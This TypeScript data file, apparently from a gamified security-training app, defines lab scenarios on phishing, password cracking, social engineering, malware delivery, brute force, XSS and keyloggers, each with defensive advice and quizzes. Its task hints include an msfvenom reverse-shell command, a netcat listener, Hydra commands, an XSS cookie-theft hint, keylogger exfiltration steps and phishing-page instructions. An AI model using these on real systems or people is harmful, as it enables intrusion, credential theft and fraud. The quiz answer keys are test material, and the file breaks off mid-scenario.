export interface ScenarioStep {
    step: number;
    title: string;
    description: string;
}

export interface QuizQuestion {
    id: number;
    question: string;
    options: string[];
    correctIndex: number;
    explanation: string;
}

export interface Task {
    id: number;
    title: string;
    description: string;
    type: "checklist" | "question";
    question?: string;
    expectedAnswer?: string;
    hint: string;
    locked: boolean;
}

export interface Scenario {
    id: string;
    name: string;
    category: string;
    difficulty: "BEGINNER" | "INTERMEDIATE" | "ADVANCED";
    estimatedTime: string;
    tools: string[];
    icon: string;
    description: string;
    locked: boolean;
    objective: {
        whatIsIt: string;
        howItWorks: ScenarioStep[];
        missions: string[];
        mentorAI: {
            intro: string;
            whyItWorks: string;
            realWorldExample: string;
            duringTips: string[];
            postLesson: string;
        };
        guardianAI: {
            redFlags: string[];
            immediateActions: string[];
            futurePrevention: string[];
        };
    };
    quiz: QuizQuestion[];
    tasks: Task[];
}

export const scenarios: Scenario[] = [
    {
        id: "phish-01",
        name: "PhishNet",
        category: "Phishing",
        difficulty: "BEGINNER",
        estimatedTime: "25 MIN",
        tools: ["Browser", "Email Client", "Social Analyzer"],
        icon: "🎣",
        locked: false,
        description: "Learn to identify and execute phishing attacks",
        objective: {
            whatIsIt: "Phishing is a social engineering attack where attackers send fraudulent messages disguised as trustworthy sources to trick victims into revealing sensitive information. It is the most common entry point for cyberattacks worldwide responsible for over 90% of data breaches.",
            howItWorks: [
                { step: 1, title: "Craft Lure", description: "Attacker creates a convincing fake email mimicking a trusted brand or person" },
                { step: 2, title: "Send and Hook", description: "Email is sent to target with a malicious link or attachment" },
                { step: 3, title: "Harvest", description: "Victim clicks and enters credentials on a fake login page controlled by attacker" }
            ],
            missions: [
                "Identify phishing indicators in a suspicious email",
                "Craft a convincing phishing email targeting CorpBank",
                "Capture credentials from the phishing landing page"
            ],
            mentorAI: {
                intro: "Phishing is the #1 cause of data breaches worldwide. It exploits human psychology not technical vulnerabilities. You will experience how an attacker tricks you into handing over your credentials.",
                whyItWorks: "Phishing works because it triggers urgency and fear. When panicked, humans bypass rational thinking and act impulsively. Attackers exploit this predictable human behaviour.",
                realWorldExample: "The 2020 Twitter hack that compromised Barack Obama, Elon Musk and Apple accounts started with a single phishing email to one Twitter employee.",
                duringTips: [
                    "Notice how the sender domain uses c0rpbank with a zero instead of the letter O",
                    "The urgency language is designed to make you panic and act without thinking",
                    "A tracking pixel fired the moment you opened the email — your IP was already captured",
                    "The fake site has an SSL certificate which is why it shows a padlock — never trust just the padlock symbol"
                ],
                postLesson: "Phishing succeeds because it targets humans not systems. Technical defences like firewalls cannot stop you from voluntarily handing over your password. Your awareness is the only defence."
            },
            guardianAI: {
                redFlags: [
                    "Sender domain c0rpbank.com uses zero not O",
                    "Reply-To address is different from From address",
                    "Urgent threatening language throughout email",
                    "Generic greeting not using your actual name",
                    "Requesting credentials via email link"
                ],
                immediateActions: [
                    "Change your CorpBank password immediately",
                    "Change password on all sites using same password",
                    "Enable 2FA on all important accounts now",
                    "Report the phishing email to IT security team",
                    "Check bank statements for suspicious transactions"
                ],
                futurePrevention: [
                    "Use a password manager — unique password per site",
                    "Enable 2FA — even stolen passwords cannot login",
                    "Always check the full URL before entering credentials",
                    "When in doubt call IT directly — never click email links",
                    "Bookmark important sites so you always know real URL"
                ]
            }
        },
        quiz: [
            {
                id: 1,
                question: "What is the most common goal of a phishing attack?",
                options: ["Crash a server", "Steal credentials", "Delete files", "Encrypt data"],
                correctIndex: 1,
                explanation: "Phishing primarily aims to steal login credentials or personal data"
            },
            {
                id: 2,
                question: "Which is a common phishing red flag?",
                options: ["Known sender email", "Urgent action required", "No links in email", "Correct spelling throughout"],
                correctIndex: 1,
                explanation: "Urgency is a classic manipulation tactic used in phishing emails"
            },
            {
                id: 3,
                question: "What is spear phishing?",
                options: ["Mass phishing emails", "Targeted attack on specific individual", "Phone based phishing", "SMS based phishing"],
                correctIndex: 1,
                explanation: "Spear phishing targets a specific person using personalized information"
            },
            {
                id: 4,
                question: "What does a phishing URL often do?",
                options: ["Always use HTTPS", "Look similar to legitimate domain", "Always contain malware", "Only work on mobile"],
                correctIndex: 1,
                explanation: "Attackers use lookalike domains like cornbank.com instead of corpbank.com"
            },
            {
                id: 5,
                question: "Best defence against phishing?",
                options: ["Antivirus software", "Security awareness training", "Firewall rules", "Strong passwords"],
                correctIndex: 1,
                explanation: "Human awareness is the most effective defence against social engineering"
            }
        ],
        tasks: [
            { id: 1, type: "checklist", title: "ANALYSE THE EMAIL", description: "Open the suspicious email in the victim panel and carefully examine it for phishing indicators like sender domain urgency language and suspicious links", hint: "Look at sender domain urgency language and hover over links without clicking", locked: false },
            { id: 2, type: "question", title: "IDENTIFY THE FAKE DOMAIN", description: "Study the sender address carefully", question: "What is the fake domain being used in the phishing email instead of corpbank.com?", expectedAnswer: "cornbank.com", hint: "Look carefully at the sender email address — one letter is different", locked: false },
            { id: 3, type: "checklist", title: "CRAFT THE PHISHING EMAIL", description: "Using the attacker terminal create a phishing email template impersonating the CorpBank IT department with an urgent password reset request", hint: "Include urgency impersonate IT department and add a fake login link", locked: false },
            { id: 4, type: "checklist", title: "DEPLOY THE LANDING PAGE", description: "Set up the fake CorpBank login page on your local server to harvest credentials from the victim", hint: "Clone the CorpBank portal login page and host it locally", locked: false },
            { id: 5, type: "question", title: "WHAT MADE IT CONVINCING?", description: "Reflect on your phishing email", question: "Name one technique that made your phishing email convincing to the victim", expectedAnswer: "urgency", hint: "Think about the psychological trigger used in the email subject line", locked: false }
        ]
    },
    {
        id: "weakpass-01",
        name: "WeakPass",
        category: "Weak Password Attack",
        difficulty: "BEGINNER",
        estimatedTime: "20 MIN",
        tools: ["Hydra", "Wordlist", "CrackStation"],
        icon: "🔑",
        locked: false,
        description: "Crack poorly secured accounts using wordlists",
        objective: {
            whatIsIt: "Weak password attacks exploit poorly chosen passwords that are short common or predictable. Attackers use prebuilt wordlists containing millions of common passwords to systematically guess credentials until one works.",
            howItWorks: [
                { step: 1, title: "Gather Target", description: "Identify login endpoint and username to attack" },
                { step: 2, title: "Load Wordlist", description: "Use tools like Hydra with rockyou.txt wordlist" },
                { step: 3, title: "Crack Access", description: "Tool tries each password automatically until successful login" }
            ],
            missions: [
                "Identify the vulnerable login endpoint",
                "Run a dictionary attack using Hydra",
                "Successfully authenticate with cracked password"
            ],
            mentorAI: {
                intro: "Weak passwords are cracked in seconds by automated tools. This lab shows you exactly how an attacker brute forces your account and why password strength is your first line of defence.",
                whyItWorks: "Brute force tools like Hydra can try thousands of passwords per second. Common passwords like admin123 or password1 are cracked in under 1 second using standard wordlists.",
                realWorldExample: "The 2012 LinkedIn breach exposed 117 million passwords. Analysis showed 700,000 users had the password 123456 and 500,000 used linkedin as their password.",
                duringTips: [
                    "Hydra is testing hundreds of passwords per second against your login endpoint",
                    "Common password lists contain millions of the most frequently used passwords worldwide",
                    "Notice how fast the crack happens — weak passwords offer virtually no protection",
                    "Rate limiting and account lockout would slow this attack significantly"
                ],
                postLesson: "A strong password is your most basic defence. Length matters more than complexity. A 16 character passphrase is stronger than a complex 8 character password. Use a password manager to generate and store strong unique passwords for every account."
            },
            guardianAI: {
                redFlags: [
                    "Multiple failed login attempts from same IP",
                    "Login attempts happening faster than human typing",
                    "Sequential or dictionary pattern in attempts",
                    "Attempts happening at unusual hours",
                    "No 2FA configured on the account"
                ],
                immediateActions: [
                    "Change your password to a strong unique one immediately",
                    "Enable account lockout after 5 failed attempts",
                    "Enable 2FA on your account right now",
                    "Check login history for unauthorised access",
                    "If accessed — revoke all active sessions"
                ],
                futurePrevention: [
                    "Use passwords of 16 or more characters",
                    "Never reuse passwords across different sites",
                    "Use a password manager like Bitwarden or 1Password",
                    "Enable 2FA on every account that supports it",
                    "Check haveibeenpwned.com to see if you were breached"
                ]
            }
        },
        quiz: [
            { id: 1, question: "What is a dictionary attack?", options: ["Encrypting a dictionary", "Using wordlist to guess passwords", "Deleting password files", "Reading browser cookies"], correctIndex: 1, explanation: "" },
            { id: 2, question: "Which tool is commonly used for password cracking?", options: ["nmap", "Wireshark", "Hydra", "Metasploit"], correctIndex: 2, explanation: "" },
            { id: 3, question: "What makes a password strong?", options: ["Your birthday", "Common word with numbers", "Long random mix of characters", "Your pets name"], correctIndex: 2, explanation: "" },
            { id: 4, question: "What is rockyou.txt?", options: ["A hacking tool", "Famous leaked password wordlist", "A type of malware", "A firewall ruleset"], correctIndex: 1, explanation: "" },
            { id: 5, question: "Best defence against password attacks?", options: ["Short passwords", "Same password everywhere", "Multi-factor authentication", "Writing password on paper"], correctIndex: 2, explanation: "" }
        ],
        tasks: [
            { id: 1, type: "checklist", title: "FIND THE LOGIN ENDPOINT", description: "Run nmap on the target to discover open ports and identify the login service running on the target machine", hint: "Run nmap to discover open ports", locked: false },
            { id: 2, type: "question", title: "IDENTIFY THE SERVICE", description: "Analyse the nmap output", question: "What port number is the login service running on?", expectedAnswer: "22", hint: "SSH runs on a very well known port number", locked: false },
            { id: 3, type: "checklist", title: "PREPARE YOUR WORDLIST", description: "Set up the attack wordlist with common passwords from the tools directory ready for the Hydra attack", hint: "Use the top 100 passwords list provided", locked: false },
            { id: 4, type: "checklist", title: "LAUNCH HYDRA ATTACK", description: "Run Hydra against the target SSH service using your prepared wordlist and watch for the successful login line", hint: "hydra -l admin -P wordlist.txt ssh://target", locked: false },
            { id: 5, type: "question", title: "WHAT WAS THE PASSWORD?", description: "Check your Hydra output", question: "What was the cracked password you found using Hydra?", expectedAnswer: "admin123", hint: "It is one of the top 10 most common passwords in the world", locked: false }
        ]
    },
    {
        id: "social-01",
        name: "SocialEng",
        category: "Social Engineering",
        difficulty: "BEGINNER",
        estimatedTime: "25 MIN",
        tools: ["OSINT Tools", "Phone Spoofer", "Pretexting Scripts"],
        icon: "🎭",
        locked: false,
        description: "Manipulate targets into revealing credentials",
        objective: {
            whatIsIt: "Social engineering manipulates human psychology rather than technical vulnerabilities to gain unauthorized access. Attackers build false trust by impersonating authority figures IT staff or colleagues to extract info.",
            howItWorks: [
                { step: 1, title: "Research Target", description: "Gather info about target using OSINT via LinkedIn social media company website" },
                { step: 2, title: "Build Pretext", description: "Create a believable false identity or scenario to justify your request" },
                { step: 3, title: "Execute Attack", description: "Contact target and manipulate them into revealing credentials or access" }
            ],
            missions: [
                "Research target employee using OSINT techniques",
                "Build a convincing pretext scenario",
                "Extract sensitive information from target"
            ],
            mentorAI: {
                intro: "Social engineering manipulates people into revealing confidential information. No technical skill is needed — just psychology. See how attackers use publicly available information to impersonate trusted people.",
                whyItWorks: "Humans are wired to trust authority figures and be helpful. Attackers exploit these natural instincts by impersonating IT staff, managers or vendors to extract sensitive data.",
                realWorldExample: "In 2019 a UK energy firm CEO transferred 220,000 euros to fraudsters after receiving a phone call from someone who perfectly impersonated his parent company boss using AI voice cloning technology.",
                duringTips: [
                    "The attacker researched you on LinkedIn before calling — they know your name and your manager",
                    "They are impersonating IT authority to trigger your instinct to comply with authority figures",
                    "Notice how they create urgency — system down in 10 minutes — to prevent you from thinking",
                    "They already know enough personal details to seem completely legitimate and trustworthy"
                ],
                postLesson: "Social engineering cannot be patched with software. The defence is a culture of verification. Always verify identity through a separate channel before providing any access or sensitive information — no matter how legitimate the caller seems."
            },
            guardianAI: {
                redFlags: [
                    "Caller asking for credentials over phone or chat",
                    "Unexpected contact from IT claiming urgent issue",
                    "Caller discouraging you from verifying identity",
                    "Pressure to act immediately without time to think",
                    "Request for unusual access outside normal process"
                ],
                immediateActions: [
                    "Never provide credentials over phone or chat",
                    "Hang up and call back on official published number",
                    "Report the social engineering attempt to IT team",
                    "If you shared anything — change those credentials",
                    "Document the call details for security investigation"
                ],
                futurePrevention: [
                    "Always verify callers through official channels",
                    "Your IT team will never ask for your password",
                    "Establish a verbal code word with your team",
                    "When pressured — slow down, that is a red flag",
                    "Attend security awareness training regularly"
                ]
            }
        },
        quiz: [
            { id: 1, question: "What does OSINT stand for?", options: ["Online Security Intelligence", "Open Source Intelligence", "Operational System Integration", "Offensive Security Interface"], correctIndex: 1, explanation: "" },
            { id: 2, question: "What is pretexting?", options: ["Sending fake texts", "Creating fabricated scenario to extract info", "Writing malicious code", "Scanning networks"], correctIndex: 1, explanation: "" },
            { id: 3, question: "Which is a social engineering technique?", options: ["SQL injection", "Buffer overflow", "Vishing", "Port scanning"], correctIndex: 2, explanation: "" },
            { id: 4, question: "What is vishing?", options: ["Visual hacking", "Voice phishing via phone calls", "Video surveillance attack", "Virtual phishing simulation"], correctIndex: 1, explanation: "" },
            { id: 5, question: "Best defence against social engineering?", options: ["Better firewall", "Verify identity before sharing info", "Stronger passwords", "More encryption"], correctIndex: 1, explanation: "" }
        ],
        tasks: [
            { id: 1, type: "checklist", title: "OSINT RECONNAISSANCE", description: "Research the target employee using LinkedIn company website and social media. Find at least 5 pieces of personal information you can use to build credibility", hint: "Check LinkedIn company website and public social media profiles", locked: false },
            { id: 2, type: "question", title: "WHAT DID YOU FIND?", description: "Review your OSINT findings", question: "What is the name of the target employee you researched?", expectedAnswer: "john smith", hint: "Check the CorpBank about page for employee names", locked: false },
            { id: 3, type: "checklist", title: "BUILD YOUR PRETEXT", description: "Create a convincing IT support impersonation scenario using the OSINT information you gathered about the target", hint: "Pretend to be from IT help desk following up on a security incident", locked: false },
            { id: 4, type: "checklist", title: "EXECUTE THE ATTACK", description: "Contact the target using your pretext scenario and attempt to extract their login credentials or access code", hint: "Ask indirectly never ask for password directly", locked: false },
            { id: 5, type: "question", title: "WHAT PSYCHOLOGICAL TECHNIQUE?", description: "Reflect on your social engineering approach", question: "What psychological technique did you use to make the target comply?", expectedAnswer: "authority", hint: "You impersonated someone with power over the target", locked: false }
        ]
    },
    {
        id: "malware-01",
        name: "MalwareDrop",
        category: "Malware Download",
        difficulty: "BEGINNER",
        estimatedTime: "30 MIN",
        tools: ["msfvenom", "Python HTTP Server", "Netcat"],
        icon: "☣️",
        locked: false,
        description: "Trick users into downloading malicious payloads",
        objective: {
            whatIsIt: "Malware download attacks trick victims into downloading and executing malicious files disguised as legitimate software. Once executed the malware gives attackers full control over the victim machine.",
            howItWorks: [
                { step: 1, title: "Create Payload", description: "Generate malicious executable disguised as legitimate software using msfvenom" },
                { step: 2, title: "Host and Deliver", description: "Host payload on fake download page and trick victim into downloading" },
                { step: 3, title: "Get Shell", description: "When victim runs the file attacker receives a reverse shell connection" }
            ],
            missions: [
                "Create a disguised malicious payload",
                "Host the payload on a fake download page",
                "Catch the reverse shell when victim executes file"
            ],
            mentorAI: {
                intro: "Malware is malicious software designed to infiltrate your system. This lab shows how a simple file download can give an attacker complete control of your computer remotely.",
                whyItWorks: "Attackers disguise malware as legitimate software updates or documents. Once executed it opens a backdoor giving the attacker full remote access to your system including files webcam and microphone.",
                realWorldExample: "The 2017 NotPetya malware disguised as a software update caused 10 billion dollars in damage worldwide and took down Maersk shipping operations for weeks.",
                duringTips: [
                    "The file looks like a legitimate software update but contains a hidden reverse shell payload",
                    "Once you run the file your machine connects back to the attacker — this is called a reverse shell",
                    "The attacker now has full access to everything on your computer — files passwords webcam",
                    "Antivirus may not detect new custom payloads which is why behaviour matters more than software"
                ],
                postLesson: "Never run files from untrusted sources. Legitimate software is distributed through official websites and app stores — never through email attachments or random download links. Always verify downloads with official checksums."
            },
            guardianAI: {
                redFlags: [
                    "Unexpected software update prompt from email",
                    "File asking for admin or root permissions",
                    "Antivirus flagging downloaded file as suspicious",
                    "Application making unexpected network connections",
                    "New unknown processes appearing in task manager"
                ],
                immediateActions: [
                    "Disconnect from network immediately",
                    "Do not turn off computer — preserve forensic evidence",
                    "Contact IT security team for incident response",
                    "Identify what data may have been accessed",
                    "Reimage the affected machine from clean backup"
                ],
                futurePrevention: [
                    "Only download software from official vendor sites",
                    "Keep operating system and software fully updated",
                    "Use application whitelisting where possible",
                    "Enable email attachment scanning on your mail system",
                    "Never run executable files received via email"
                ]
            }
        },
        quiz: [
            { id: 1, question: "What is a reverse shell?", options: ["A secure shell connection", "Victim machine connects back to attacker", "A type of encryption", "A firewall bypass"], correctIndex: 1, explanation: "" },
            { id: 2, question: "What does msfvenom do?", options: ["Scans networks", "Generates malicious payloads", "Cracks passwords", "Intercepts traffic"], correctIndex: 1, explanation: "" },
            { id: 3, question: "What disguise do malware droppers often use?", options: ["System update or free software", "Bank notifications", "Error messages", "All of the above"], correctIndex: 3, explanation: "" },
            { id: 4, question: "What is a C2 server?", options: ["A cloud storage server", "Command and control server for malware", "A certificate authority", "A content delivery network"], correctIndex: 1, explanation: "" },
            { id: 5, question: "Best defence against malware downloads?", options: ["Download from any website", "Only install from trusted sources", "Disable antivirus", "Use HTTP not HTTPS"], correctIndex: 1, explanation: "" }
        ],
        tasks: [
            { id: 1, type: "checklist", title: "GENERATE THE PAYLOAD", description: "Use msfvenom to create a reverse shell executable disguised as a legitimate software update file", hint: "msfvenom -p windows/meterpreter/reverse_tcp LHOST=your-ip LPORT=4444 -f exe > update.exe", locked: false },
            { id: 2, type: "question", title: "WHAT PAYLOAD DID YOU USE?", description: "Check your msfvenom command", question: "What msfvenom payload did you use for a Windows reverse shell?", expectedAnswer: "windows/meterpreter/reverse_tcp", hint: "It is the most common Windows meterpreter payload in Metasploit", locked: false },
            { id: 3, type: "checklist", title: "HOST THE DOWNLOAD PAGE", description: "Start a Python HTTP server to host your payload and make it accessible to the victim machine", hint: "python3 -m http.server 8080", locked: false },
            { id: 4, type: "checklist", title: "SET UP YOUR LISTENER", description: "Start a netcat or Metasploit listener on port 4444 ready to catch the incoming reverse shell connection", hint: "nc -lvnp 4444 in a separate terminal", locked: false },
            { id: 5, type: "question", title: "WHAT PORT DID YOU USE?", description: "Check your listener setup", question: "What port number did you configure for the reverse shell connection?", expectedAnswer: "4444", hint: "It is the default Metasploit listener port", locked: false }
        ]
    },
    {
        id: "brute-01",
        name: "BruteX",
        category: "Brute Force",
        difficulty: "INTERMEDIATE",
        estimatedTime: "35 MIN",
        tools: ["Hydra", "Burp Suite", "Medusa"],
        icon: "💪",
        locked: false,
        description: "Systematically break authentication barriers",
        objective: {
            whatIsIt: "Brute force attacks systematically try every possible combination of characters until the correct password is found. Unlike dictionary attacks brute force tries all combinations making it slower but more thorough.",
            howItWorks: [
                { step: 1, title: "Identify Target", description: "Find login form and determine username to attack" },
                { step: 2, title: "Configure Attack", description: "Set character set and length range in your brute force tool" },
                { step: 3, title: "Run and Wait", description: "Tool systematically tries all combinations until match found" }
            ],
            missions: [
                "Intercept login request using Burp Suite",
                "Configure and launch brute force attack",
                "Successfully authenticate with found password"
            ],
            mentorAI: {
                intro: "Brute force attacks systematically try every possible password combination until they find the right one. See how automated tools can crack web application logins rapidly.",
                whyItWorks: "Web applications without rate limiting allow unlimited login attempts. Automated tools exploit this to try thousands of passwords per second until the correct one is found.",
                realWorldExample: "In 2018 the Dunkin Donuts breach exposed 300,000 customer accounts through a credential stuffing attack — a form of targeted brute force using previously leaked passwords.",
                duringTips: [
                    "Burp Suite intercepted your login request and revealed the exact parameters being sent",
                    "Hydra is now replaying the request thousands of times with different password values",
                    "Without rate limiting there is nothing stopping this automated tool from trying forever",
                    "A CAPTCHA or account lockout would have stopped this attack after just a few attempts"
                ],
                postLesson: "Rate limiting and account lockout are simple defences that stop brute force attacks completely. As a user enabling 2FA means even if your password is cracked the attacker still cannot access your account."
            },
            guardianAI: {
                redFlags: [
                    "Multiple failed login attempts in short time",
                    "Login attempts from unusual geographic location",
                    "Automated pattern in request timing and structure",
                    "No CAPTCHA protecting the login form",
                    "Account lockout policy not configured"
                ],
                immediateActions: [
                    "Lock the targeted account immediately",
                    "Block the attacking IP address at firewall",
                    "Check if any login attempts succeeded",
                    "Force password reset on affected account",
                    "Enable 2FA before unlocking the account"
                ],
                futurePrevention: [
                    "Implement account lockout after 5 failed attempts",
                    "Add CAPTCHA to all login forms",
                    "Enable 2FA on all user accounts",
                    "Use a strong unique password on every account",
                    "Monitor and alert on multiple failed login attempts"
                ]
            }
        },
        quiz: [
            { id: 1, question: "What distinguishes brute force from dictionary?", options: ["Brute force is faster", "Brute force tries all combinations", "Dictionary is more thorough", "They are the same"], correctIndex: 1, explanation: "" },
            { id: 2, question: "Which tool brute forces web login forms?", options: ["nmap", "Wireshark", "Burp Suite Intruder", "Netcat"], correctIndex: 2, explanation: "" },
            { id: 3, question: "What defence stops brute force?", options: ["HTTPS", "Account lockout policy", "Firewall", "Antivirus"], correctIndex: 1, explanation: "" },
            { id: 4, question: "What is credential stuffing?", options: ["Using leaked creds on other sites", "Stuffing passwords into a file", "A type of SQL injection", "Brute forcing SSH"], correctIndex: 0, explanation: "" },
            { id: 5, question: "How does CAPTCHA help against brute force?", options: ["Encrypts passwords", "Blocks automated login attempts", "Hashes credentials", "Monitors traffic"], correctIndex: 1, explanation: "" }
        ],
        tasks: [
            { id: 1, type: "checklist", title: "INTERCEPT LOGIN REQUEST", description: "Configure Burp Suite as a proxy and capture the login POST request to identify the exact parameter names", hint: "Set Burp as proxy attempt login check HTTP history tab", locked: false },
            { id: 2, type: "question", title: "WHAT ARE THE PARAMETERS?", description: "Inspect the captured POST request in Burp Suite", question: "What is the name of the password field in the login POST request?", expectedAnswer: "password", hint: "Look at the POST body in Burp Suite request inspector", locked: false },
            { id: 3, type: "checklist", title: "CONFIGURE HYDRA", description: "Set up Hydra with the correct target URL POST parameters and wordlist for the web login brute force attack", hint: "hydra -l admin -P rockyou.txt target http-post-form", locked: false },
            { id: 4, type: "checklist", title: "LAUNCH THE ATTACK", description: "Execute the Hydra brute force attack and wait for the successful credential discovery", hint: "Watch for the green success line in Hydra", locked: false },
            { id: 5, type: "question", title: "HOW MANY ATTEMPTS?", description: "Check the Hydra output summary", question: "Approximately how many password attempts did Hydra make before succeeding?", expectedAnswer: "847", hint: "Check the Hydra output for attempt count", locked: false }
        ]
    },
    {
        id: "xss-01",
        name: "XSSploit",
        category: "Cross Site Scripting",
        difficulty: "INTERMEDIATE",
        estimatedTime: "35 MIN",
        tools: ["Browser DevTools", "Burp Suite", "BeEF"],
        icon: "💉",
        locked: false,
        description: "Inject malicious scripts into web applications",
        objective: {
            whatIsIt: "Cross-Site Scripting allows attackers to inject malicious scripts into web pages viewed by other users. The injected code runs in victims browsers allowing session theft keylogging and page defacement.",
            howItWorks: [
                { step: 1, title: "Find Input", description: "Locate unsanitized input fields that reflect content back to users" },
                { step: 2, title: "Inject Script", description: "Insert JavaScript payload into the vulnerable field" },
                { step: 3, title: "Execute and Steal", description: "When victim views the page the script runs and sends data to attacker" }
            ],
            missions: [
                "Find the XSS vulnerable input field",
                "Execute a basic XSS proof of concept",
                "Steal a victim session cookie using XSS"
            ],
            mentorAI: {
                intro: "Cross-Site Scripting lets attackers inject malicious code into websites you trust. When you visit the page the attacker code runs in your browser with full access to your session.",
                whyItWorks: "When a website reflects user input back to the page without sanitising it an attacker can inject JavaScript that steals cookies hijacks sessions or redirects victims to malicious sites.",
                realWorldExample: "In 2014 a stored XSS vulnerability on eBay allowed attackers to redirect buyers to fake payment pages. The attack affected millions of listings before being patched.",
                duringTips: [
                    "The search field reflects your input directly back to the page without any sanitisation",
                    "The injected script runs in your browser with the same permissions as the website itself",
                    "Your session cookie is now being sent to the attacker server — they can use it to log in as you",
                    "Content Security Policy headers would have blocked this script from executing entirely"
                ],
                postLesson: "XSS is prevented by sanitising all user input before displaying it. As a user you can protect yourself by keeping browsers updated enabling XSS protection in browser settings and being cautious about clicking unknown links even on websites you normally trust."
            },
            guardianAI: {
                redFlags: [
                    "Unexpected popup or alert appearing on webpage",
                    "Browser redirecting to unknown domain suddenly",
                    "Session logged out unexpectedly after page load",
                    "URL contains unusual encoded characters or scripts",
                    "Page behaving differently than normal"
                ],
                immediateActions: [
                    "Log out of all sessions on the affected site",
                    "Clear all browser cookies and cache immediately",
                    "Change password on the affected site now",
                    "Report the XSS vulnerability to the site owner",
                    "Check other accounts if same password was used"
                ],
                futurePrevention: [
                    "Keep your browser and extensions fully updated",
                    "Use browser extensions that block malicious scripts",
                    "Enable 2FA so stolen cookies alone are insufficient",
                    "Avoid clicking unfamiliar links even on trusted sites",
                    "Use private browsing for sensitive activities"
                ]
            }
        },
        quiz: [
            { id: 1, question: "What type of XSS persists in the database?", options: ["Reflected XSS", "Stored XSS", "DOM XSS", "Blind XSS"], correctIndex: 1, explanation: "" },
            { id: 2, question: "Simplest XSS test payload?", options: ["' OR 1=1--", "<script>alert(1)</script>", "../../../etc/passwd", "; ls -la"], correctIndex: 1, explanation: "" },
            { id: 3, question: "What can XSS steal?", options: ["Database contents", "Session cookies", "Server files", "Encrypted passwords"], correctIndex: 1, explanation: "" },
            { id: 4, question: "What defence prevents XSS?", options: ["SQL parameterization", "Output encoding and CSP", "Rate limiting", "HTTPS"], correctIndex: 1, explanation: "" },
            { id: 5, question: "What does DOM-based XSS exploit?", options: ["Server side code", "Client side JavaScript", "Database queries", "Network traffic"], correctIndex: 1, explanation: "" }
        ],
        tasks: [
            { id: 1, type: "checklist", title: "FIND THE VULNERABLE INPUT", description: "Test all input fields on the target web application to find one that reflects unsanitized content back to the page", hint: "Type your name and see if it appears on page — check source", locked: false },
            { id: 2, type: "question", title: "WHICH FIELD IS VULNERABLE?", description: "Based on your testing identify the vulnerable field", question: "Which input field on the target page is vulnerable to XSS?", expectedAnswer: "search", hint: "Try typing your name in each field and see which one reflects it back", locked: false },
            { id: 3, type: "checklist", title: "EXECUTE PROOF OF CONCEPT", description: "Inject a basic script alert payload into the vulnerable field to confirm the XSS vulnerability exists", hint: "<script>alert('XSS')</script> in search or comment field", locked: false },
            { id: 4, type: "checklist", title: "CRAFT COOKIE THEFT PAYLOAD", description: "Build and inject a payload that exfiltrates the victim session cookie to your attacker controlled server", hint: "document.location with document.cookie", locked: false },
            { id: 5, type: "question", title: "WHAT DEFENCE WOULD STOP THIS?", description: "Think about HTTP security headers", question: "What HTTP security header would have prevented this XSS attack?", expectedAnswer: "content-security-policy", hint: "It is abbreviated as CSP and controls which scripts can execute on the page", locked: false }
        ]
    },
    {
        id: "klog-01",
        name: "KeyLogger",
        category: "Keylogger Attack",
        difficulty: "INTERMEDIATE",
        estimatedTime: "40 MIN",
        tools: ["Python", "Pynput", "Netcat", "msfvenom"],
        icon: "⌨️",
        locked: false,
        description: "Capture keystrokes from a compromised system",
        objective: {
            whatIsIt: "Keyloggers secretly record every keystroke made on a target device and transmit the data to the attacker. They can capture passwords messages and sensitive data without the victim knowing anything is wrong.",
            howItWorks: [
                { step: 1, title: "Deploy Logger", description: "Install keylogger on target system via malware or physical access" },
                { step: 2, title: "Capture Keystrokes", description: "Logger silently records all keystrokes in background process" },
                { step: 3, title: "Exfiltrate Data", description: "Recorded data sent to attacker server periodically" }
            ],
            missions: [
                "Write a basic Python keylogger",
                "Deploy it silently on the target system",
                "Receive and analyse captured keystrokes"
            ],
            mentorAI: {
                intro: "Keyloggers silently record everything you type — passwords emails and private messages. Once installed they run invisibly in the background sending your keystrokes to the attacker.",
                whyItWorks: "Keyloggers operate at the operating system level capturing input before it is encrypted. They are often bundled in legitimate looking software making them very difficult to detect without dedicated security tools.",
                realWorldExample: "The 2016 Bangladesh Bank heist where attackers stole 81 million dollars began with a keylogger installed on bank computers that captured SWIFT banking system credentials.",
                duringTips: [
                    "The keylogger was installed silently when you ran what looked like a legitimate application",
                    "Every keystroke you type is being captured and stored in a hidden log file",
                    "The log is emailed to the attacker every 60 seconds — they are reading in real time",
                    "Your passwords typed anywhere on this machine are now compromised permanently"
                ],
                postLesson: "Keyloggers are defeated by using 2FA — even if your password is captured the attacker cannot login without the second factor. Password managers also help because they autofill credentials without keyboard input."
            },
            guardianAI: {
                redFlags: [
                    "Unknown processes running in task manager",
                    "Unusual network traffic to unknown destinations",
                    "System running slower than normal unexpectedly",
                    "Antivirus detecting suspicious keyboard hooks",
                    "Files being created in unexpected directories"
                ],
                immediateActions: [
                    "Disconnect from network to stop data exfiltration",
                    "Do not type any passwords on the infected machine",
                    "Contact IT for forensic investigation",
                    "Change all passwords from a different clean device",
                    "Reimage the machine from a verified clean backup"
                ],
                futurePrevention: [
                    "Enable 2FA — makes captured passwords useless",
                    "Use a password manager to avoid keyboard typing",
                    "Only install software from verified official sources",
                    "Run regular antivirus and antimalware scans",
                    "Monitor running processes for unknown applications"
                ]
            }
        },
        quiz: [
            { id: 1, question: "Where do hardware keyloggers typically sit?", options: ["Inside the CPU", "Between keyboard and computer", "In the network router", "Inside the monitor"], correctIndex: 1, explanation: "" },
            { id: 2, question: "What Python library is used for keylogging?", options: ["requests", "pynput", "flask", "socket"], correctIndex: 1, explanation: "" },
            { id: 3, question: "How do keyloggers persist on a system?", options: ["As a browser extension", "Added to system startup programs", "Stored in RAM only", "Via network connection"], correctIndex: 1, explanation: "" },
            { id: 4, question: "Most valuable data from keyloggers?", options: ["Game scores", "Passwords and banking info", "Browser history", "Desktop screenshots"], correctIndex: 1, explanation: "" },
            { id: 5, question: "Which defence detects keyloggers?", options: ["Firewall", "Antivirus with behavior detection", "VPN", "Encryption"], correctIndex: 1, explanation: "" }
        ],
        tasks: [
            { id: 1, type: "checklist", title: "WRITE THE KEYLOGGER", description: "Write a Python keylogger script using pynput that captures all keystrokes and saves them to a log file", hint: "from pynput import keyboard — use on_press listener", locked: false },
            { id: 2, type: "question", title: "WHAT LIBRARY DID YOU USE?", description: "Identify the Python library for keyboard input", question: "What Python library did you use to capture keyboard input?", expectedAnswer: "pynput", hint: "It is specifically designed for monitoring input devices in Python", locked: false },
            { id: 3, type: "checklist", title: "ADD EXFILTRATION", description: "Modify your keylogger to automatically email the captured keystroke log to your server every 60 seconds", hint: "Use smtplib to email logs every 60 seconds", locked: false },
